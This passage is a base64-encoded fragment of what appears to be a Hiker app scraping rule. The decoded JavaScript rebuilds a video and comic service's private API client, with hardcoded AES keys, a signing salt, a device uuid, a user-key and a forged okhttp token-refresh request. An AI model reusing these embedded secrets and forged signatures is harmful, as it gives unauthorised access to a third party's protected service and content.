kYXRhLnZpZGVvX2ZpbGUsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcbiAgICAgICAgfSlcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGA8aDE+JHthcGl2aWV3LnN0cm9uZyhkYXRhLnRpdGxlKX08L2gxPiR7YXBpdmlldy5ncmF5KGRhdGEuYXV0aG9yKX1gLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcbiAgICAgICAgfSlcXG4gICAgICAgIGFwaXZpZXcudHV3ZW4oZCxkYXRhKVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgNDpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGA8aDE+JHthcGl2aWV3LnN0cm9uZyhkYXRhLnRpdGxlKX08L2gxPiR7YXBpdmlldy5ncmF5KGRhdGEuYXV0aG9yKX1gLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcbiAgICAgICAgfSlcXG4gICAgICAgIGFwaXZpZXcudHV3ZW4oZCxkYXRhKVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgNTpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgdXJsOiBpbWcsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdwaWNfMV9mdWxsJ1xcbiAgICAgICAgfSlcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6ICfigJzigJznlLXlj7DigJ3igJ0nLFxcbiAgICAgICAgICAgIHVybDogJ2h0dHBzOi8vYWttYWl2aWRlby5jZGNodWFuZ2FvLmNvbScgKyBkYXRhLnZpZGVvLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMSdcXG4gICAgICAgIH0pXFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBgPGgxPiR7YXBpdmlldy5zdHJvbmcoZGF0YS50aXRsZSl9PC9oMT4ke2FwaXZpZXcuZ3JheShkYXRhLmF1dGhvcil9YCxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCdcXG4gICAgICAgIH0pXFxuICAgICAgICBhcGl2aWV3LnR1d2VuKGQsZGF0YSlcXG4gICAgICAgIGJyZWFrO1xcbiAgICBjYXNlIDY6XFxuXFxuICAgICAgICBicmVhaztcXG59XFxuaWYoZ2V0TXlWYXIoJ2ExJywnY3JlYXRlZF9hdCcpID09ICdjcmVhdGVkX2F0Jyl7XFxudmFyIHRleHQgPSAn5b2T5YmN5o6S5bqP77ya5oyJ5pe26Ze0J1xcbn1cXG5pZihnZXRNeVZhcignYTEnKSA9PSAnbGlrZXMnKXtcXG52YXIgdGV4dCA9ICflvZPliY3mjpLluo/vvJrmjInng63luqYnXFxufVxcbi8vbG9nKGdldE15VmFyKCdhMScsJ2NyZWF0ZWRfYXQnKSlcXG52YXIgcGFpeHUgPSAkKCcjbm9Mb2FkaW5nIycpLmI2NCgpLmxhenlSdWxlKCgpID0+IHtcXG4gICAgaWYoZ2V0TXlWYXIoJ2ExJywnY3JlYXRlZF9hdCcpID09ICdjcmVhdGVkX2F0Jyl7XFxuICAgICAgICBwdXRNeVZhcignYTEnLCdsaWtlcycpXFxuICAgICAgICB0b2FzdCgn5oyJ54Ot5bqmJylcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgfVxcbiAgICBpZihnZXRNeVZhcignYTEnKSA9PSAnbGlrZXMnKXtcXG4gICAgICAgIHB1dE15VmFyKCdhMScsJ2NyZWF0ZWRfYXQnKVxcbiAgICAgICAgdG9hc3QoJ+aMieaXtumXtCcpXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH1cXG59KVxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBhcGl2aWV3LmJpZyhhcGl2aWV3LnN0cm9uZygn55u45YWz5Zue5aSN5YWxJytkYXRhLnJlcGx5X2NvdW50cysn5p2hJykpKydcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0JythcGl2aWV3LmFkZHJlc3NUYWcocGFpeHUsdGV4dCksXFxuICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXG59KVxcbn1cXG52YXIgdXJsID0gYXBpdmlldy5ob3N0KycvdjIuNS9jb21tZW50L2xpc3QnXFxudmFyIGJvZHkgPSBhcGl2aWV3LkVuY3J5cHQoJ2FydGljbGVfaWQ9JytpZCsnJnBhZ2U9JytNWV9QQUdFKycmc2l6ZT0yMCZzb3J0aW5nPScrZ2V0TXlWYXIoJ2ExJywnY3JlYXRlZF9hdCcpKVxcbnZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLCBib2R5KSkuZGF0YTsgLy9sb2coZGF0YSlcXG5hcGl2aWV3LnBpbmdsdW4oZCxkYXRhKVxcblxcbnNldFJlc3VsdChkKVwiLFwiZ3JvdXBcIjpcIiNcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcIlwiLFwicGFnZXNcIjpcIlt7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLlh73mlbBcXFwiLFxcXCJwYXRoXFxcIjpcXFwiaGFuc2h1XFxcIixcXFwicnVsZVxcXCI6XFxcImNvbnN0IGFwaXZpZXcgPSB7XFxcXG4gICAgY29sb3I6ICh0ZXN0KSA9PiB7XFxcXG4gICAgICAgIHJldHVybiAnPGZvbnQgY29sb3I9XFxcXFxcXCIjRkE3Mjk4XFxcXFxcXCI+JyArIHRlc3QgKyAnPC9mcm9udD4nO1xcXFxuICAgIH0sXFxcXG4gICAgc3Ryb25nOiAodGVzdCkgPT4ge1xcXFxuICAgICAgICByZXR1cm4gJzxzdHJvbmc+JyArIHRlc3QgKyAnPC9zdHJvbmc+JztcXFxcbiAgICB9LFxcXFxuICAgIHNtYWxsOiAodGVzdCkgPT4ge1xcXFxuICAgICAgICByZXR1cm4gJzxzbWFsbD4nICsgdGVzdCArICc8L3NtYWxsPic7XFxcXG4gICAgfSxcXFxcbiAgICBjZW50ZXI6ICh0ZXN0KSA9PiB7XFxcXG4gICAgICAgIHJldHVybiAnPHAgc3R5bGU9XFxcXFxcXCJ0ZXh0LWFsaWduOiBjZW50ZXI7XFxcXFxcXCI+JyArIHRlc3QgKyAnPC9wPidcXFxcbiAgICB9LFxcXFxuICAgIGJpZzogKHRlc3QpID0+IHtcXFxcbiAgICAgICAgcmV0dXJuICc8YmlnPicgKyB0ZXN0ICsgJzwvYmlnPic7XFxcXG4gICAgfSxcXFxcbiAgICBncmF5OiAodGVzdCkgPT4ge1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCI8Zm9udCBjb2xvcj0nZ3JheSc+XFxcXFxcXCIgKyB0ZXN0ICsgXFxcXFxcXCI8L2ZvbnQ+XFxcXFxcXCI7XFxcXG4gICAgfSxcXFxcbiAgICByaWNoOiAodGVzdCkgPT4ge1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCLigJjigJjigJnigJlcXFxcXFxcIiArIHRlc3Q7XFxcXG4gICAgfSxcXFxcbiAgICBhZGRyZXNzVGFnOiAodXJsLCB0ZXh0KSA9PiB7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcIjxhIGhyZWY9J1xcXFxcXFwiICsgdXJsICsgXFxcXFxcXCInPlxcXFxcXFwiICsgdGV4dCArIFxcXFxcXFwiPC9hPlxcXFxcXFwiXFxcXG4gICAgfSxcXFxcbiAgICBlbXB0eTogXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCIsXFxcXG4gICAgbGF5b3V0OiBbXSxcXFxcbiAgICBub0xvYWQ6IFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIixcXFxcbiAgICB0aW1lc3RhbXA6ICgpID0+IE1hdGguZmxvb3IobmV3IERhdGUoKS5nZXRUaW1lKCkgLyAxMDAwKSxcXFxcbiAgICB0MTA6ICgpID0+IGFwaXZpZXcudGltZXN0YW1wKCkudG9TdHJpbmcoKSxcXFxcbiAgICB0MTM6ICgpID0+IGFwaXZpZXcudDEwKCkgKyAnMDAwJyxcXFxcbiAgICBob3N0OiBnZXRJdGVtKFxcXFxcXFwiYXBpXFxcXFxcXCIpLFxcXFxuICAgIGdldERhdGVzQXJyYXk6IChlbmREYXRlKSA9PiB7XFxcXG4gICAgICAgIC8vIOWwhue7k+adn+aXpeacn+Wtl+espuS4sui9rOaNouS4ukRhdGXlr7nosaFcXFxcbiAgICAgICAgbGV0IGVuZERhdGVPYmogPSBuZXcgRGF0ZShlbmREYXRlKTtcXFxcblxcXFxuICAgICAgICAvLyDojrflj5blvZPliY3ml6XmnJ9cXFxcbiAgICAgICAgbGV0IGN1cnJlbnREYXRlID0gbmV3IERhdGUoKTtcXFxcblxcXFxuICAgICAgICAvLyDliJ3lp4vljJbml6XmnJ/mlbDnu4RcXFxcbiAgICAgICAgbGV0IGRhdGVzQXJyYXkgPSBbXTtcXFxcblxcXFxuICAgICAgICAvLyDlvqrnjq/ku47lvZPliY3ml6XmnJ/liLDnu5PmnZ/ml6XmnJ9cXFxcbiAgICAgICAgd2hpbGUgKGN1cnJlbnREYXRlID49IGVuZERhdGVPYmopIHtcXFxcbiAgICAgICAgICAgIC8vIOWwhuaXpeacn+i9rOaNouS4ullZWVktTU0tRETmoLzlvI/nmoTlrZfnrKbkuLLlubbmt7vliqDliLDmlbDnu4RcXFxcbiAgICAgICAgICAgIGRhdGVzQXJyYXkucHVzaChjdXJyZW50RGF0ZS50b0lTT1N0cmluZygpLnNwbGl0KCdUJylbMF0pO1xcXFxuXFxcXG4gICAgICAgICAgICAvLyDlh4/ljrvkuIDlpKlcXFxcbiAgICAgICAgICAgIGN1cnJlbnREYXRlLnNldERhdGUoY3VycmVudERhdGUuZ2V0RGF0ZSgpIC0gMSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgLypcXFxcbiAgICAgICAgICAgIC8vIOWPjei9rOaVsOe7hOS7peaMiemZjeW6j+aOkuWIl+aXpeacn1xcXFxuICAgICAgICAgICAgZGF0ZXNBcnJheS5yZXZlcnNlKCk7XFxcXG4gICAgICAgICovXFxcXG4gICAgICAgIHJldHVybiBkYXRlc0FycmF5O1xcXFxuICAgIH0sXFxcXG4gICAgZ2V0WWVhck1vbnRoQXJyYXk6IChlbmREYXRlKSA9PiB7XFxcXG4gICAgICAgIGxldCBlbmREYXRlT2JqID0gbmV3IERhdGUoZW5kRGF0ZSk7XFxcXG4gICAgICAgIGxldCBjdXJyZW50RGF0ZSA9IG5ldyBEYXRlKCk7XFxcXG4gICAgICAgIGxldCB5ZWFyTW9udGhBcnJheSA9IFtdO1xcXFxuXFxcXG4gICAgICAgIC8vIOehruS/neW9k+WJjeaXpeacn+S4jeWwj+S6jue7k+adn+aXpeacn1xcXFxuICAgICAgICBpZiAoY3VycmVudERhdGUgPCBlbmREYXRlT2JqKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4geWVhck1vbnRoQXJyYXk7IC8vIOWmguaenOW9k+WJjeaXpeacn+Wwj+S6jue7k+adn+aXpeacn++8jOebtOaOpei/lOWbnuepuuaVsOe7hFxcXFxuICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgLy8g5b6q546v5LuO5b2T5YmN5pel5pyf5Yiw57uT5p2f5pel5pyfXFxcXG4gICAgICAgIHdoaWxlIChjdXJyZW50RGF0ZSA+PSBlbmREYXRlT2JqKSB7XFxcXG4gICAgICAgICAgICAvLyDojrflj5blvZPliY3ml6XmnJ/nmoTlubTlkozmnIjvvIzlubbmoLzlvI/ljJbkuLpcXFxcXFxcIllZWVktTU1cXFxcXFxcIuWtl+espuS4slxcXFxuICAgICAgICAgICAgbGV0IHllYXIgPSBjdXJyZW50RGF0ZS5nZXRGdWxsWWVhcigpO1xcXFxuICAgICAgICAgICAgbGV0IG1vbnRoID0gKGN1cnJlbnREYXRlLmdldE1vbnRoKCkgKyAxKS50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyk7IC8vIOaciOS7veS7jjDlvIDlp4vvvIzmiYDku6XliqAx77yM5bm25LiU56Gu5L+d5piv5Lik5L2N5pWwXFxcXG4gICAgICAgICAgICBsZXQgeWVhck1vbnRoID0gYCR7eWVhcn0tJHttb250aH1gOyAvLyDmraPnoa7kvb/nlKjmqKHmnb/lrZfnrKbkuLJcXFxcblxcXFxuICAgICAgICAgICAgLy8g5bCG5bm05pyI5a2X56ym5Liy5re75Yqg5Yiw5pWw57uEXFxcXG4gICAgICAgICAgICB5ZWFyTW9udGhBcnJheS5wdXNoKHllYXJNb250aCk7XFxcXG5cXFxcbiAgICAgICAgICAgIC8vIOWHj+WOu+S4gOS4quaciFxcXFxuICAgICAgICAgICAgY3VycmVudERhdGUuc2V0TW9udGgoY3VycmVudERhdGUuZ2V0TW9udGgoKSAtIDEpO1xcXFxuICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgcmV0dXJuIHllYXJNb250aEFycmF5O1xcXFxuICAgIH0sXFxcXG4gICAgQ3J5cHRvSlM6IG51bGwsIC8vIOeUqOS6juWtmOWCqCBDcnlwdG9KUyDlr7nosaFcXFxcbiAgICBpbml0Q3J5cHRvSlM6ICgpID0+IHtcXFxcbiAgICAgICAgaWYgKCFhcGl2aWV3LkNyeXB0b0pTKSB7XFxcXG4gICAgICAgICAgICBldmFsKGdldENyeXB0b0pTKCkpOyAvLyDmiafooYzkuIDmrKEgZXZhbO+8jOehruS/nSBgQ3J5cHRvSlNgIOWPmOmHj+iiq+WumuS5iVxcXFxuICAgICAgICAgICAgYXBpdmlldy5DcnlwdG9KUyA9IENyeXB0b0pTOyAvLyDlsIYgYENyeXB0b0pTYCDnvJPlrZjliLAgYGFwaXZpZXcuQ3J5cHRvSlNgXFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIEVuY3J5cHQ6ICh3b3JkKSA9PiB7XFxcXG4gICAgICAgIGFwaXZpZXcuaW5pdENyeXB0b0pTKCk7IC8vIOehruS/nSBDcnlwdG9KUyDlt7LliqDovb1cXFxcbiAgICAgICAgbGV0IGtleSA9IGFwaXZpZXcuQ3J5cHRvSlMuZW5jLlV0ZjgucGFyc2UoXFxcXFxcXCJsKmJ2JVppcTAwMEJpYW9nXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgaXYgPSBhcGl2aWV3LkNyeXB0b0pTLmVuYy5VdGY4LnBhcnNlKFxcXFxcXFwiODU5NzUwNjAwMjkzOTI0OVxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IGVuY3J5cHQgPSBhcGl2aWV3LkNyeXB0b0pTLkFFUy5lbmNyeXB0KHdvcmQsIGtleSwge1xcXFxuICAgICAgICAgICAgaXY6IGl2LFxcXFxuICAgICAgICAgICAgbW9kZTogYXBpdmlldy5DcnlwdG9KUy5tb2RlLkNCQyxcXFxcbiAgICAgICAgICAgIHBhZGRpbmc6IGFwaXZpZXcuQ3J5cHRvSlMucGFkLlBrY3M3LFxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIGVuY3J5cHQudG9TdHJpbmcoKTsgLy8g6buY6K6k6L+U5ZueIEJhc2U2NCDnvJbnoIHnmoTlrZfnrKbkuLJcXFxcbiAgICB9LFxcXFxuICAgIERlY3J5cHQ6ICh3b3JkKSA9PiB7XFxcXG4gICAgICAgIGFwaXZpZXcuaW5pdENyeXB0b0pTKCk7IC8vIOehruS/nSBDcnlwdG9KUyDlt7LliqDovb1cXFxcbiAgICAgICAgbGV0IGtleSA9IGFwaXZpZXcuQ3J5cHRvSlMuZW5jLlV0ZjgucGFyc2UoXFxcXFxcXCJsKmJ2JVppcTAwMEJpYW9nXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgaXYgPSBhcGl2aWV3LkNyeXB0b0pTLmVuYy5VdGY4LnBhcnNlKFxcXFxcXFwiODU5NzUwNjAwMjkzOTI0OVxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IGRlY3J5cHQgPSBhcGl2aWV3LkNyeXB0b0pTLkFFUy5kZWNyeXB0KHdvcmQsIGtleSwge1xcXFxuICAgICAgICAgICAgaXY6IGl2LFxcXFxuICAgICAgICAgICAgbW9kZTogYXBpdmlldy5DcnlwdG9KUy5tb2RlLkNCQyxcXFxcbiAgICAgICAgICAgIHBhZGRpbmc6IGFwaXZpZXcuQ3J5cHRvSlMucGFkLlBrY3M3LFxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIGRlY3J5cHQudG9TdHJpbmcoYXBpdmlldy5DcnlwdG9KUy5lbmMuVXRmOCk7IC8vIOino+Wvhue7k+aenOi9rOaNouS4uuaWh+acrOagvOW8j1xcXFxuICAgIH0sXFxcXG4gICAgRGVjcnlwdDE6IChpbnB1dCkgPT4ge1xcXFxuICAgICAgICByZXR1cm4gJChpbnB1dCkuaW1hZ2UoKCkgPT4ge1xcXFxuICAgICAgICAgICAgY29uc3QgQ3J5cHRvVXRpbCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vYXNzZXRzL2NyeXB0by1qYXZhLmpzXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IGtleSA9IENyeXB0b1V0aWwuRGF0YS5wYXJzZVVURjgoXFxcXFxcXCJzYUlaWGM0eU12cTBJejU2XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IGl2ID0gQ3J5cHRvVXRpbC5EYXRhLnBhcnNlVVRGOChcXFxcXFxcImtiSll0QkpVRUNUMG95am9cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBsZXQgdGV4dERhdGEgPSBDcnlwdG9VdGlsLkRhdGEucGFyc2VJbnB1dFN0cmVhbShpbnB1dCk7XFxcXG4gICAgICAgICAgICBsZXQgZW5jcnlwdGVkID0gQ3J5cHRvVXRpbC5BRVMuZGVjcnlwdCh0ZXh0RGF0YSwga2V5LCB7XFxcXG4gICAgICAgICAgICAgICAgbW9kZTogXFxcXFxcXCJBRVMvQ0JDL1BLQ1M3UGFkZGluZ1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGl2OiBpdlxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gZW5jcnlwdGVkLnRvSW5wdXRTdHJlYW0oKTtcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9LFxcXFxuICAgIGdldHRva2VuOiAoKSA9PiB7XFxcXG4gICAgICAgIHZhciBodG1sID0gZmV0Y2goYXBpdmlldy5ob3N0KycvdjIuNS9yZWZyZXNoL3Rva2VuJywge1xcXFxuICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyxcXFxcbiAgICAgICAgICAgICAgICAndXVpZCc6ICdjOWFkMjIxZi1iNDQ1LTM5ZDItODVmNS1hNjkzYzI0MTE1ZTMnLFxcXFxuICAgICAgICAgICAgICAgICd0aW1lc3RhbXAnOiBhcGl2aWV3LnQxMCgpLFxcXFxuICAgICAgICAgICAgICAgICdpcCc6ICcwLjAuMC4wJyxcXFxcbiAgICAgICAgICAgICAgICAndXNlci1rZXknOiAnNzYwMzU1Y2M4ODIxOGYwYzE1MTRmNTY3NjQzNjIwNjYnLFxcXFxuICAgICAgICAgICAgICAgICdwbGF0Zm9ybSc6ICcxJyxcXFxcbiAgICAgICAgICAgICAgICAnc2lnbic6IG1kNShtZDUoJzAuMC4wLjAuMS4nK2FwaXZpZXcudDEwKCkrJy43NjAzNTVjYzg4MjE4ZjBjMTUxNGY1Njc2NDM2MjA2Ni5jOWFkMjIxZi1iNDQ1LTM5ZDItODVmNS1hNjkzYzI0MTE1ZTMnKSsnbTRuMmhqUGVZV2tENnRGcHFLRl4zSE9eaDI0UEBpZFQnKSxcXFxcbiAgICAgICAgICAgICAgICAnYXBwLXZlcnNpb24nOiAnMi4yLjknLFxcXFxuICAgICAgICAgICAgICAgICdDb250ZW50LUxlbmd0aCc6ICcwJyxcXFxcbiAgICAgICAgICAgICAgICAnSG9zdCc6IGFwaXZpZXcuaG9zdC5zcGxpdCgnLy8nKVsxXSxcXFxcbiAgICAgICAgICAgICAgICAnQ29ubmVjdGlvbic6ICdLZWVwLUFsaXZlJyxcXFxcbiAgICAgICAgICAgICAgICAvLydBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCcsXFxcXG4gICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnb2todHRwLzQuMy4xJyxcXFxcbiAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICBtZXRob2Q6ICdQT1NUJ1xcXFxuICAgICAgICB9KTsgLy9sb2coaHRtbClcXFxcbiAgICAgICAgdmFyIGh0bWwxID0gYXBpdmlldy5EZWNyeXB0KGh0bWwpOyAvL2xvZyhodG1sMSlcXFxcbiAgICAgICAgLy92YXIgbG9nZ2VkX2F0ID0gSlNPTi5wYXJzZShodG1sMSkuZGF0YS51c2VyLmxvZ2dlZF9hdC5zcGxpdCgnICcpWzBdOyBsb2cobG9nZ2VkX2F0KVxcXFxuICAgICAgICB2YXIgdG9rZW4gPSBKU09OLnBhcnNlKGh0bWwxKS5kYXRhLnVzZXIudG9rZW47IGxvZyh0b2tlbilcXFxcbiAgICAgICAgLy9zZXRJdGVtKFxcXFxcXFwibG9nZ2VkX2F0XFxcXFxcXCIsbG9nZ2VkX2F0KVxcXFxuICAgICAgICBzZXRJdGVtKFxcXFxcXFwidG9rZW5cXFxcXFxcIix0b2tlbilcXFxcbiAgICB9LFxcXFxuICAgIGdldGh0bWw6ICh1cmwsYm9keSkgPT4ge1xcXFxuICAgICAgICB2YXIgaHRtbCA9IGZldGNoKHVybCwge1xcXFxuICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICd1dWlkJzogJ2M5YWQyMjFmLWI0NDUtMzlkMi04NWY1LWE2OTNjMjQxMTVlMycsXFxcXG4gICAgICAgICAgICAgICAgJ3RpbWVzdGFtcCc6IGFwaXZpZXcudDEwKCksXFxcXG4gICAgICAgICAgICAgICAgJ2lwJzogJzAuMC4wLjAnLFxcXFxuICAgICAgICAgICAgICAgICd1c2VyLWtleSc6ICc3NjAzNTVjYzg4MjE4ZjBjMTUxNGY1Njc2NDM2MjA2NicsXFxcXG4gICAgICAgICAgICAgICAgJ3BsYXRmb3JtJzogJzEnLFxcXFxuICAgICAgICAgICAgICAgICdzaWduJzogbWQ1KG1kNSgnMC4wLjAuMC4xLicrYXBpdmlldy50MTAoKSsnLjc2MDM1NWNjODgyMThmMGMxNTE0ZjU2NzY0MzYyMDY2LmM5YWQyMjFmLWI0NDUtMzlkMi04NWY1LWE2OTNjMjQxMTVlMycpKydtNG4yaGpQZVlXa0Q2dEZwcUtGXjNIT15oMjRQQGlkVCcpLFxcXFxuICAgICAgICAgICAgICAgICdhcHAtdmVyc2lvbic6ICcyLjIuOScsXFxcXG4gICAgICAgICAgICAgICAgJ3Rva2VuJzogZ2V0SXRlbShcXFxcXFxcInRva2VuXFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyxcXFxcbiAgICAgICAgICAgICAgICAnQ29udGVudC1MZW5ndGgnOiAnMCcsXFxcXG4gICAgICAgICAgICAgICAgJ0hvc3QnOiBhcGl2aWV3Lmhvc3Quc3BsaXQoJy8vJylbMV0sXFxcXG4gICAgICAgICAgICAgICAgJ0Nvbm5lY3Rpb24nOiAnS2VlcC1BbGl2ZScsXFxcXG4gICAgICAgICAgICAgICAgLy8nQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAnLFxcXFxuICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ29raHR0cC80LjMuMScsXFxcXG4gICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgYm9keTogYm9keSwgICAgICAgICAgICBcXFxcbiAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxcXFxuICAgICAgICAgICAgcmVqZWN0Q29kaW5nOiB0cnVlXFxcXG4gICAgICAgIH0pOyAvL2xvZyhodG1sKVxcXFxuICAgICAgICB2YXIgaHRtbDEgPSBhcGl2aWV3LkRlY3J5cHQoaHRtbCk7IC8vbG9nKGh0bWwxKVxcXFxuICAgICAgICByZXR1cm4gaHRtbDFcXFxcbiAgICB9LFxcXFxuICAgIHR1d2VueWlqaTogKGQsZGF0YSkgPT4ge1xcXFxuICAgICAgICBkYXRhLmZvckVhY2goaXRlbSA9PiB7XFxcXG4gICAgICAgICAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBpdGVtLnB1Ymxpc2hlZF9hdC5zcGxpdCgnICcpWzBdLFxcXFxuICAgICAgICAgICAgICAgIGltZzogaW1nLFxcXFxuICAgICAgICAgICAgICAgIHVybDogYGhpa2VyOi8vcGFnZS9lcmppP3BhZ2U9ZnlwYWdlI25vSGlzdG9yeSMjZ2FtZVRoZW1lI2AsXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8yJyxcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBtb2RlbF9pZDogaXRlbS5tb2RlbF9pZCxcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGl0ZW0uaWQsXFxcXG4gICAgICAgICAgICAgICAgICAgIGltZzogaW1nXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9LFxcXFxuICAgIHl1ZWR1eWlqaTogKGQsZGF0YSkgPT4ge1xcXFxuICAgICAgICBkYXRhLmZvckVhY2goaXRlbSA9PiB7XFxcXG4gICAgICAgICAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBpdGVtLnRpdGxlICsgJ1xcXFxcXFxcbicgKyBpdGVtLmF1dGhvcixcXFxcbiAgICAgICAgICAgICAgICBkZXNjOiBpdGVtLmRlc2NyaXB0aW9uLFxcXFxuICAgICAgICAgICAgICAgIGltZzogaW1nLFxcXFxuICAgICAgICAgICAgICAgIHVybDogYGhpa2VyOi8vcGFnZS9lcmppP3BhZ2U9ZnlwYWdlI25vSGlzdG9yeSMjZ2FtZVRoZW1lI2AsXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8xX2xlZnRfcGljJyxcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBtb2RlbF9pZDogaXRlbS5tb2RlbF9pZCxcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGl0ZW0uaWQsXFxcXG4gICAgICAgICAgICAgICAgICAgIGltZzogaW1nXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9LFxcXFxuICAgIHlpbmdzaGl5aWppOiAoZCxkYXRhKSA9PiB7XFxcXG4gICAgICAgIGRhdGEuZm9yRWFjaChpdGVtID0+IHtcXFxcbiAgICAgICAgICAgIHZhciBpbWcgPSBhcGl2aWV3LkRlY3J5cHQxKCdodHRwczovL2ptdHAuZ3BncmVpaS5jb20nICsgaXRlbS50aHVtYilcXFxcbiAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGl0ZW0udGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogaXRlbS5kZXNjcmlwdGlvbixcXFxcbiAgICAgICAgICAgICAgICBpbWc6IGltZyxcXFxcbiAgICAgICAgICAgICAgICB1cmw6IGBoaWtlcjovL3BhZ2UvZXJqaT9wYWdlPWZ5cGFnZSNub0hpc3RvcnkjI2dhbWVUaGVtZSNgLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnbW92aWVfMV9sZWZ0X3BpYycsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbW9kZWxfaWQ6IGl0ZW0ubW9kZWxfaWQsXFxcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBpdGVtLmlkLFxcXFxuICAgICAgICAgICAgICAgICAgICBpbWc6IGltZ1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSxcXFxcbiAgICBkaWFudGFpeWlqaTogKGQsZGF0YSkgPT4ge1xcXFxuICAgICAgICBkYXRhLmZvckVhY2goaXRlbSA9PiB7XFxcXG4gICAgICAgICAgICB2YXIgaW1nI